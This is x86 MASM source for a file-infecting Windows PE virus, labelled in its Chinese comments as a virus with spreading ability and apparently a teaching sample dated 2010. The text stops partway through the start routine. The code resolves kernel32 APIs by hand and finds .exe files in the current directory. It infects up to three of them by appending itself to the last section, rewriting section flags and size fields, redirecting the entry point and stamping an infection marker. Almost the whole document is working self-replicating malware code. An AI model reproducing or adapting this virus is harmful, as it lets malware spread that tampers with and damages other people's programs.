;-------------------------
; PE病毒程序
; 本段代码使用了将代码添加到最后一节的方法
; 程序功能：实现创建目录的方法，具备传播功能
; 作者：戚利
; 开发日期：2010.7.7
;-------------------------

    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc


VIR_TOTAL_SIZE       equ  offset vir_end-offset vir_start
INFECTFILES                 equ  03h                        ;感染文件的个数
DEFAULT_KERNEL_BASE         equ  07C800000h                 ;kernel32的默认基地址
DEFAULT_KERNEL_BASEwNT      equ  077F00000h


_ProtoGetProcAddress  typedef proto :dword,:dword
_ProtoLoadLibrary     typedef proto :dword
_ProtoCreateDir       typedef proto :dword,:dword


_ApiGetProcAddress    typedef ptr _ProtoGetProcAddress
_ApiLoadLibrary       typedef ptr _ProtoLoadLibrary
_ApiCreateDir         typedef ptr _ProtoCreateDir

    .code
;被添加到目标文件的代码从这里开始，到vir_end处结束
vir_start equ this byte

jmp _NewEntry


szGetProcAddr  db  'GetProcAddress',0
szLoadLib      db  'LoadLibraryA',0
szCreateDir    db  'CreateDirectoryA',0   ;该方法在kernel32.dll中
szDir          db  'c:\\BBBN',0           ;要创建的目录


mark_                 db  '[VirPE.Qili.v1.00]',0 ;病毒标识
                      db  '(c)2010 Qili ShanDong',0
EXE_MASK              db  '*.exe',0
infections            dd  00000000h              ;感染文件的个数，超过指定个数即退出
kernel                dd  DEFAULT_KERNEL_BASE

szFunNames        equ this byte            ;函数名列表
szFindFirstFileA       db 'FindFirstFileA',0
szFindNextFileA        db 'FindNextFileA',0
szFindClose            db 'FindClose',0
szCreateFileA          db 'CreateFileA',0
szSetFilePointer       db 'SetFilePointer',0
szSetFileAttributesA   db 'SetFileAttributesA',0
szCloseHandle          db 'CloseHandle',0
szGetCurrentDirectoryA db 'GetCurrentDirectoryA',0
szSetCurrentDirectoryA db 'SetCurrentDirectoryA',0
szGetWindowsDirectoryA db 'GetWindowsDirectoryA',0
szGetSystemDirectoryA  db 'GetSystemDirectoryA',0
szCreateFileMappingA   db 'CreateFileMappingA',0
szMapViewOfFile        db 'MapViewOfFile',0
szUnmapViewOfFile      db 'UnmapViewOfFile',0
szSetEndOfFile         db 'SetEndOfFile',0
                       db 0bbh               ;结束符

                      dd  12345678h
newSize               dd  00000000h
searchHandle          dd  00000000h
fileHandle            dd  00000000h
mapHandle             dd  00000000h
mapAddress            dd  00000000h
addressTableVA        dd  00000000h
nameTableVA           dd  00000000h
ordinalTableVA        dd  78563412h
dwPatchCodeSize       dd  ?     ;补丁代码大小
dwNewFileSize         dd  ?     ;新文件大小=目标文件大小+补丁代码大小
dwNewPatchCodeSize    dd ?    ;补丁代码按8位对齐后的大小
dwPatchCodeSegStart   dd ?   ;补丁代码所在节在文件中的起始地址
dwSectionCount        dd ?   ;目标文件节的个数
dwSections            dd ?   ;所有节表大小
dwNewHeaders          dd ?   ;新文件头的大小
dwFileAlign           dd ?   ;文件对齐粒度
dwFirstSectionStart   dd ?   ;目标文件第一节距离文件起始的偏移量
dwOff                 dd ?   ;新文件比原来多出来的部分
dwValidHeadSize       dd ?   ;目标文件PE头的有效数据长度
dwHeaderSize          dd ?   ;文件头长度
dwBlock1              dd ?   ;原PE头的有效数据长度+补丁代码的有效数据长度
dwPE_SECTIONSize      dd ?   ;PE头+节表大小
dwSectionsLeft        dd ?   ;目标文件所有节数据的大小
dwNewSectionSize      dd ?   ;新增加节对齐后的尺寸
dwNewSectionOff       dd ?   ;新增加节项描述在文件中的偏移
dwDstSizeOfImage      dd ?   ;目标文件内存映像的大小
dwNewSizeOfImage      dd ?   ;新增加的节在内存映像中的大小
dwNewFileAlignSize    dd ?   ;文件对齐后的大小
dwSectionsAlignLeft   dd ?   ;目标文件节在文件中对齐后的大小
dwLastSectionAlignSize  dd ?   ;目标文件最后一节对齐后的最终大小，包含代码
dwLastSectionStart      dd ?   ;目标文件最后一节在文件中的偏移
dwSectionAlign          dd ?   ;节对齐粒度
dwVirtualAddress        dd ?   ;最后一节的起始RVA
dwEIPOff                dd ?   ;新EIP指针和旧EIP指针的距离



dwDstEntryPoint      dd ?   ;旧的入口地址
dwNewEntryPoint      dd ?   ;新的入口地址

lpFunAddress         equ this byte          ;函数地址列表
_FindFirstFileA       dd  00000000h
_FindNextFileA        dd  00000000h
_FindClose            dd  00000000h
_CreateFileA          dd  00000000h
_SetFilePointer       dd  00000000h
_SetFileAttributesA   dd  00000000h
_CloseHandle          dd  00000000h
_GetCurrentDirectoryA dd  00000000h
_SetCurrentDirectoryA dd  00000000h
_GetWindowsDirectoryA dd  00000000h
_GetSystemDirectoryA  dd  00000000h
_CreateFileMappingA   dd  00000000h
_MapViewOfFile        dd  00000000h
_UnmapViewOfFile      dd  00000000h
_SetEndOfFile         dd  00000000h

MAX_PATH         equ 260


WIN32_FIND_DATA1  equ this byte
 WFD_dwFileAttributes   dd  ?
 WFD_ftCreationTime     FILETIME <?>
 WFD_ftLastAccessTime   FILETIME <?>
 WFD_ftLastWriteTime    FILETIME <?>
 WFD_nFileSizeHigh      dd  ?
 WFD_nFileSizeLow       dd  ?
 WFD_dwReserved0        dd  ?
 WFD_dwReserved1        dd  ?
 WFD_szFileName         db  MAX_PATH dup(?)
 WFD_szAlternateFileName db 13 dup(?)
                         db 03 dup (?)
directories     equ this byte
OriginDir               db   7Fh dup (0)           ;应用程序所在的目录

dwDirectoryCount        equ (($-directories)/7Fh)
mirrormirror            db  dwDirectoryCount       ;目录个数



;-----------------------------
; 错误 Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;-----------------------------
; 对齐
; 入口：eax----对齐的值
;       ecx----对齐因子
; 出口：eax----对齐以后的值
;-----------------------------
_align       proc
    push edx

    xor edx,edx
    div ecx
    .if edx>0
      inc eax
    .endif
    xor edx,edx
    mul ecx
    pop edx
    ret
_align       endp
;------------------------------------
; 根据kernel32.dll中的一个地址获取它的基地址
;------------------------------------
_getKernelBase  proc _dwKernelRetAddress
   local @dwRet

   pushad

   mov @dwRet,0
   
   mov edi,_dwKernelRetAddress
   and edi,0ffff0000h  ;查找指令所在页的边界，以1000h对齐

   .repeat
     .if word ptr [edi]==IMAGE_DOS_SIGNATURE  ;找到kernel32.dll的dos头
        mov esi,edi
        add esi,dword ptr [esi+003ch]
        .if word ptr [esi]==IMAGE_NT_SIGNATURE ;找到kernel32.dll的PE头标识
          mov @dwRet,edi
          .break
        .endif
     .endif
     sub edi,010000h
     .break .if edi<070000000h
   .until FALSE
   popad
   mov eax,@dwRet
   ret
_getKernelBase  endp   

;-------------------------------
; 获取指定字符串的API函数的调用地址
; 入口参数：_hModule为动态链接库的基址，_lpApi为API函数名的首址
; 出口参数：eax为函数在虚拟地址空间中的真实地址
;-------------------------------
_getApi proc _hModule,_lpApi
   local @ret
   local @dwLen

   pushad
   mov @ret,0
   ;计算API字符串的长度，含最后的零
   mov edi,_lpApi
   mov ecx,-1
   xor al,al
   cld
   repnz scasb
   mov ecx,edi
   sub ecx,_lpApi
   mov @dwLen,ecx

   ;从pe文件头的数据目录获取导出表地址
   mov esi,_hModule
   add esi,dword ptr [esi+3ch]
   assume esi:ptr IMAGE_NT_HEADERS
   mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
   add esi,_hModule
   assume esi:ptr IMAGE_EXPORT_DIRECTORY

   ;查找符合名称的导出函数名
   mov ebx,[esi].AddressOfNames
   add ebx,_hModule
   xor edx,edx
   .repeat
     push esi
     mov edi,[ebx]
     add edi,_hModule
     mov esi,_lpApi
     mov ecx,@dwLen
     repz cmpsb
     .if ZERO?
       pop esi
       jmp @F
     .endif
     pop esi
     add ebx,4
     inc edx
   .until edx>=[esi].NumberOfNames
   jmp _ret
@@:
   ;通过API名称索引获取序号索引再获取地址索引
   sub ebx,[esi].AddressOfNames
   sub ebx,_hModule
   shr ebx,1
   add ebx,[esi].AddressOfNameOrdinals
   add ebx,_hModule
   movzx eax,word ptr [ebx]
   shl eax,2
   add eax,[esi].AddressOfFunctions
   add eax,_hModule
   
   ;从地址表得到导出函数的地址
   mov eax,[eax]
   add eax,_hModule
   mov @ret,eax

_ret:
   assume esi:nothing
   popad
   mov eax,@ret
   ret
_getApi endp

;---------------------
; 获取所有的API入口地址
;---------------------
_getAllAPIs           proc
     pushad
     call @F   ; 免去重定位
@@:
     pop ebx
     sub ebx,offset @B   ;求定位基地址ebx            
     mov ebp,ebx
       
     .repeat
       push esi
       mov eax,[ebx+kernel]
       push eax
       call _getApi
       mov dword ptr [edi],eax
       ;修改esi的值指向下一个函数名
       mov al,byte ptr [esi]
       .break .if al==0BBh
       .repeat
         mov al,byte ptr [esi]
         .if al==0
           inc esi
           .break
         .endif
         inc esi
       .until FALSE

       ;修改edi的值指向下一个地址
       add edi,4
     .until FALSE
     popad
     ret
_getAllAPIs           endp


;----------------------------------------
; 获取节的个数
;----------------------------------------
_getSectionCount  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections
  mov @dwReturn,ecx
  popad
  mov eax,@dwReturn
  ret
_getSectionCount endp

;----------------------------------------
; 获取文件的对齐粒度
;----------------------------------------
getSectionAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.SectionAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getSectionAlign  endp

;---------------------
; 将文件偏移转换为内存偏移量RVA
; lp_FileHead为文件头的起始地址
; _dwOff为给定的文件偏移地址
;---------------------
_OffsetToRVA proc _lpFileHead,_dwOffset
  local @dwReturn
  
  pushad

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwOffset
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].PointerToRawData
    add eax,[edx].SizeOfRawData    ;计算该节结束RVA
    .if (edi>=[edx].PointerToRawData)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      sub edi,eax                ;计算RVA在节中的偏移
      mov eax,[edx].VirtualAddress
      add eax,edi                ;加上节在内存中的起始位置
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_OffsetToRVA endp
;---------------------
; 将内存偏移量RVA转换为文件偏移
;---------------------
_RVAToOffset proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;计算该节结束RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].VirtualAddress
      sub edi,eax                ;计算RVA在节中的偏移
      mov eax,[edx].PointerToRawData
      add eax,edi                ;加上节在文件中的的起始位置
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_RVAToOffset endp

;----------------------------------------
; 获取新节的RVA地址
;----------------------------------------
_getNewSectionRVA  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,esi
  add edi,sizeof IMAGE_NT_HEADERS
  assume edi:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections

  
  xor edx,edx
  mov eax,ecx
  dec eax
  mov bx,sizeof IMAGE_SECTION_HEADER
  mul bx
  add edi,eax       ;定位到最后一个节定义处
  assume edi:ptr IMAGE_SECTION_HEADER
  mov eax,[edi].SizeOfRawData
  xor edx,edx
  mov bx,1000h
  div bx
  .if edx!=0
    inc eax
  .endif
  xor edx,edx
  mul bx
  mov ebx,eax

  mov eax,[edi].VirtualAddress
  add eax,ebx

  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getNewSectionRVA endp



;------------------------
; 获取RVA所在节的名称
;------------------------
_getRVASectionName  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;计算该节结束RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,edx
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionName  endp

;------------------------
; 获取RVA所在节的文件起始地址
;------------------------
_getRVASectionStart  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;计算该节结束RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionStart  endp

;------------------------
; 获取RVA所在节的原始大小
;------------------------
_getRVASectionSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;计算该节结束RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      ;invoke _appendInfo,edx
      mov eax,[edx].Misc
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionSize  endp
;-------------------
; 取代码所在节的大小
; 代码节定位方法：
; 入口地址指向的RVA所在的节
; _lpHeader指向内存中PE文件的起始
; 返回值在eax中
;-------------------
getCodeSegSize proc _lpHeader
   local @dwSize
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;调整ESI指针指向PE文件头
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint

   invoke _getRVASectionSize,_lpHeader,eax
   mov @dwSize,eax   
   popad
   mov eax,@dwSize
   ret
getCodeSegSize endp

;-------------------
; 取补丁代码所在节的大小
; _lpHeader指向内存中PE文件的起始
; 返回值在eax中
;-------------------
getCodeSegStart proc _lpHeader
   local @dwStart
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;调整ESI指针指向PE文件头
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint
   invoke _getRVASectionStart,_lpHeader,eax
   mov @dwStart,eax   
   popad
   mov eax,@dwStart
   ret
getCodeSegStart endp

;-------------------------
; 获取代码入口
;-------------------------
getEntryPoint  proc  _lpFile
   local @ret
   pushad
   mov edi,_lpFile
   assume edi:ptr IMAGE_DOS_HEADER

   add edi,[edi].e_lfanew    ;调整ESI指针指向PE文件头
   assume edi:ptr IMAGE_NT_HEADERS
   ;取源程序装载地址
   add edi,4
   add edi,sizeof IMAGE_FILE_HEADER
   assume edi:ptr IMAGE_OPTIONAL_HEADER32
   mov eax,[edi].AddressOfEntryPoint
   mov @ret,eax
   popad
   mov eax,@ret
   ret
getEntryPoint endp


;------------------------
; 获取RVA所在节在文件中对齐以后的大小
;------------------------
_getRVASectionRawSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;遍历节表
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;计算该节结束RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].SizeOfRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionRawSize  endp

_getRVACount  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
_getRVACount endp

;------------------------------------
; 获取最后一节的在文件的偏移
;-------------------------------------
getLastSectionStart proc _lpFileHead
  local @ret
  pushad
  invoke _getRVACount,_lpFileHead
  xor edx,edx
  dec eax
  mov ecx,28h
  mul ecx

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  add esi,sizeof IMAGE_NT_HEADERS  
  add esi,eax
  assume esi:ptr IMAGE_SECTION_HEADER
  mov eax,[esi].PointerToRawData
  mov @ret,eax
  popad
  mov eax,@ret
  ret
getLastSectionStart endp

getFileAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.FileAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getFileAlign  endp
;-----------------------------
; 截文件
; 入口：ecx----要截取的文件大小
; 出口：无
;-----------------------------         
truncFile       proc
    xor eax,eax
    push eax
    push eax
    push ecx
    push dword ptr [ebx+fileHandle]
    call [ebx+_SetFilePointer]
    push dword ptr [ebx+fileHandle]
    call [ebx+_SetEndOfFile]
    ret
truncFile       endp

;------------------------------
; 打开文件
; 入口：esi--指向要打开的文件的名字
; 出口：eax--如果成功是文件句柄，失败则是-1
;------------------------------    
openFile        proc
    xor eax,eax
    push eax
    push eax
    push 0000003h
    push eax
    inc eax
    push eax
    push 80000000h or 40000000h
    push esi
    call [ebx+_CreateFileA]
    ret
openFile        endp

;-----------------------------------
; 创建映射
; 入口：ecx---映射大小
; 出口：eax---成功为映射句柄
;-----------------------------------    
createMap      proc
    xor eax,eax
    push eax
    push ecx
    push eax
    push 000000004h
    push eax
    push dword ptr [ebx+fileHandle]
    call [ebx+_CreateFileMappingA]
    ret
createMap      endp

;-------------------------------------
; 映射文件到进程地址空间
; 入口：ecx----要映射的尺寸
; 出口：eax----成功则返回地址
;-------------------------------------  
mapFile        proc
    xor eax,eax
    push ecx
    push eax
    push eax
    push 00000002h
    push dword ptr [ebx+mapHandle]
    call [ebx+_MapViewOfFile]
    ret
mapFile        endp

;---------------------------------
;   指定感染文件
;---------------------------------
_infect proc
    ;获取文件名，清除文件属性
    lea esi,[ebx+WFD_szFileName]
    push 80h
    push esi
    call [ebx+_SetFileAttributesA]
    call openFile
    inc eax  ;如果eax=-1，则打开文件出错
    jz cannotOpen
    dec eax
    mov dword ptr [ebx+fileHandle],eax
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call createMap   ;创建映射文件
    or eax,eax
    jz closeFile
    mov dword ptr [ebx+mapHandle],eax
    ;映射文件到内存
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call mapFile
    or eax,eax
    jz unMapFile
    mov dword ptr [ebx+mapAddress],eax

   

    ;开始处理文件，判断文件是否为合法PE文件
    mov esi,[eax+3ch]
    add esi,eax
    cmp dword ptr [esi],"EP"        ;比较是否为“PE”
    jnz noInfect

    push esi
    mov esi,dword ptr [ebx+mapAddress]
    add esi,4
    mov eax,dword ptr [esi]
    pop esi

    cmp eax,"iliq"  ;比较是否被处理过 
    jz noInfect

    push dword ptr [esi+3ch]        ;保存文件对齐
    pop ecx                         ;恢复文件对齐   

 
    mov eax,VIR_TOTAL_SIZE
    mov dword ptr [ebx+dwPatchCodeSize],eax


    ;将文件大小按照文件对齐粒度对齐
    invoke getFileAlign,[ebx+mapAddress]
    mov dword ptr [ebx+dwFileAlign],eax
    xchg eax,ecx
    mov eax,dword ptr [ebx+WFD_nFileSizeLow]
    invoke _align
    mov dword ptr [ebx+dwNewFileAlignSize],eax    

    ;求最后一节在文件中的偏移
    invoke getLastSectionStart,[ebx+mapAddress]
    mov dword ptr [ebx+dwLastSectionStart],eax
  
    ;求最后一节大小
    mov eax,dword ptr [ebx+dwNewFileAlignSize]
    sub eax,dword ptr [ebx+dwLastSectionStart]
    add eax,dword ptr [ebx+dwPatchCodeSize]
    ;将该值按照文件对齐粒度对齐
    mov ecx,dword ptr [ebx+dwFileAlign]
    invoke _align
    mov dword ptr [ebx+dwLastSectionAlignSize],eax

    ;求新文件大小
    mov eax,dword ptr [ebx+dwLastSectionStart]
    add eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov dword ptr [ebx+dwNewFileSize],eax

    ;关闭内存映射
    pushad
    push dword ptr [ebx+mapAddress]
    call [ebx+_UnmapViewOfFile]
    push dword ptr [ebx+mapHandle]
    call [ebx+_CloseHandle]
    popad


    ;用新尺寸重新映射文件
    mov dword ptr [ebx+newSize],eax
    xchg ecx,eax
    call createMap
    or eax,eax
    jz closeFile
    mov dword ptr [ebx+mapHandle],eax
    mov ecx,dword ptr [ebx+newSize]
    call mapFile
    or eax,eax
    jz unMapFile
    mov dword ptr [ebx+mapAddress],eax

    ;修正

    ;计算SizeOfRawData
    invoke _getRVACount,[ebx+mapAddress]
    xor edx,edx
    dec eax
    mov ecx,sizeof IMAGE_SECTION_HEADER
    mul ecx

    mov edi,dword ptr [ebx+mapAddress]
    assume edi:ptr IMAGE_DOS_HEADER
    add edi,[edi].e_lfanew
    mov esi,edi
    assume esi:ptr IMAGE_NT_HEADERS
    add edi,sizeof IMAGE_NT_HEADERS  
    add edi,eax
    assume edi:ptr IMAGE_SECTION_HEADER
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov [edi].SizeOfRawData,eax

    ;计算Misc值
    invoke getSectionAlign,[ebx+mapAddress]
    mov dword ptr [ebx+dwSectionAlign],eax
    xchg eax,ecx
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    invoke _align
    mov [edi].Misc,eax

    ;修改标志
    or dword ptr [edi].Characteristics,0A0000020h;更改节的标志
    push esi
    mov esi,dword ptr [ebx+mapAddress]
    add esi,4
    mov dword ptr [esi],"iliq"  ;设置病毒标志
    pop esi

    ;计算VirtualAddress
    mov eax,[edi].VirtualAddress  ;取原始RVA值
    mov dword ptr [ebx+dwVirtualAddress],eax

    ;修正函数入口地址  
    mov eax,dword ptr [ebx+dwNewFileAlignSize]
    invoke _OffsetToRVA,[ebx+mapAddress],eax
    mov dword ptr [ebx+dwNewEntryPoint],eax
    mov edi,dword ptr [ebx+mapAddress]
    assume edi:ptr IMAGE_DOS_HEADER
    add edi,[edi].e_lfanew    
    assume edi:ptr IMAGE_NT_HEADERS
    mov eax,[edi].OptionalHeader.AddressOfEntryPoint
    mov dword ptr [ebx+dwDstEntryPoint],eax
    mov eax,dword ptr [ebx+dwNewEntryPoint]
    mov [edi].OptionalHeader.AddressOfEntryPoint,eax
  
    mov eax,dword ptr [ebx+dwDstEntryPoint]
    sub eax,dword ptr [ebx+dwNewEntryPoint]
    mov dword ptr [ebx+dwEIPOff],eax

    ;修正SizeOfImage
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov ecx,dword ptr [ebx+dwSectionAlign]
    invoke _align
    ;获取最后一个节的VirtualAddress
    add eax,dword ptr [ebx+dwVirtualAddress]
    mov [edi].OptionalHeader.SizeOfImage,eax  

    ;拷贝补丁代码
    lea esi,[ebx+vir_start]
    mov edi,dword ptr [ebx+mapAddress]
    add edi,dword ptr [ebx+dwNewFileAlignSize]

    mov ecx,dword ptr [ebx+dwPatchCodeSize]
    rep movsb
  
    ;修正补丁代码中的E9指令后的操作数  
    mov eax,dword ptr [ebx+mapAddress]
    add eax,dword ptr [ebx+dwNewFileAlignSize]
    add eax,dword ptr [ebx+dwPatchCodeSize]

    
    sub eax,5   ;EAX指向了E9的操作数
    mov edi,eax

    sub eax,dword ptr [ebx+mapAddress]
    add eax,4

    nop
    mov ecx,dword ptr [ebx+dwDstEntryPoint]
    invoke _OffsetToRVA,[ebx+mapAddress],eax
    sub ecx,eax
    mov dword ptr [edi],ecx
    inc byte ptr [ebx+infections]   ;增加计数，如果超过指定个数，则返回
    jmp unMapFile                   ;将新增加的模块追加到文件尾部

noInfect:
    ;如果修改失败，则恢复原文件，并将计数减1
    dec byte ptr [ebx+infections]
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call truncFile
unMapFile:
    push dword ptr [ebx+mapAddress]
    call [ebx+_UnmapViewOfFile]
closeMap:
    push dword ptr [ebx+mapHandle]
    call [ebx+_CloseHandle]
closeFile:
    push dword ptr [ebx+fileHandle]
    call [ebx+_CloseHandle]
cannotOpen:
    ;设置文件原先的属性
    push dword ptr [ebx+WFD_dwFileAttributes]
    lea eax,[ebx+WFD_szFileName]
    push eax
    call [ebx+_SetFileAttributesA]

    ret
_infect    endp

;-----------------------------
; 对5个文件进行感染
;-----------------------------
_infectIt  proc
    ;首先找到第一个符合条件的文件
    and dword ptr [ebx+infections],00000000h   ;计数清零
    lea eax,[ebx+offset WIN32_FIND_DATA1]
    push eax
    lea eax,[ebx+offset EXE_MASK]
    push eax
    call [ebx+_FindFirstFileA]  
    
    inc eax   ;如果没有，即返回-1，则退出
    jz failInfect
    dec eax
    mov dword ptr [ebx+searchHandle],eax  ;存储搜索文件句柄
_1:
    call _infect
    cmp byte ptr [ebx+infections],INFECTFILES     ;处理超过3个文件，就退出
    jz failInfect
_2:
    ;清空上一次填充的文件名内容，为下一步做准备
    lea edi,[ebx+WFD_szFileName]
    mov ecx,MAX_PATH
    xor al,al
    rep stosb
    lea eax,[ebx+offset WIN32_FIND_DATA1]
    push eax
    push dword ptr [ebx+searchHandle]
    ;找下一个符合条件的文件
    call [ebx+_FindNextFileA]
    or eax,eax  ;找到下一个文件则转到_1继续处理
    jnz _1
failInfect:
    ret
_infectIt endp

_infectItAll proc 
    ;指向第一个目录
    lea edi,[ebx+directories]
    push edi
    ;处理当前目录中的exe文件
    call [ebx+_SetCurrentDirectoryA]
    call _infectIt
    ret
_infectItAll  endp



_start  proc
    local hKernel32Base:dword              ;存放kernel32.dll基址
    local hUser32Base:dword

    local _getProcAddress:_ApiGetProcAddress  ;定义函数
    local _loadLibrary:_ApiLoadLibrary
    local _createDir:_ApiCreateDir    

    pushad

    ;获取kernel32.dll的基地址
    invoke _getKernelBase,eax
    mov hKernel32Base,eax
    mov dword ptr [ebx+kernel],eax

    ;从基地址出发搜索GetProcAddress函数的首址
    mov eax,offset szGetProcAddr
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi

    invoke _getApi,ecx,eax
    mov _getProcAddress,eax   ;为函数引用赋值 GetProcAddress

